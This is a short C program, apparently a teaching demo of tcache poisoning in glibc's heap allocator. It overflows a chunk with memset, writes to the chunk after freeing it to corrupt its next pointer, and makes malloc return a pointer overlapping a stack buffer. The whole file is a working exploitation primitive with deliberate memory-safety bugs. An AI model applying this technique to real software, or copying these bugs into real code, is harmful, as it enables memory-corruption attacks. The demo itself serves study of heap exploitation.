#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

int main() {
    intptr_t *p1, *p2, *p3;
    size_t target[10];
    printf("Our target is a stack region at %p\n", (void *)target);

    p1 = malloc(0x30);
    memset(p1, 0x41, 0x30+8);
    fprintf(stderr, "Allocated victim chunk with requested size 0x30 at %p\n", p1);

    fprintf(stderr, "Freed victim chunk to put it in a tcache bin\n");
    free(p1);
    fprintf(stderr, "Emulating corruption of the next ptr\n");
    *p1 = (int64_t)target;

    fprintf(stderr, "Now we make two requests for the appropriate size so that malloc returns a chunk overlapping our target\n");
    p2 = malloc(0x30);
    memset(p2, 0x42, 0x30+8);
    p3 = malloc(0x30);
    memset(p3, 0x42, 0x30+8);
    fprintf(stderr, "The first malloc(0x30) returned %p, the second one: %p\n", p2, p3);
}
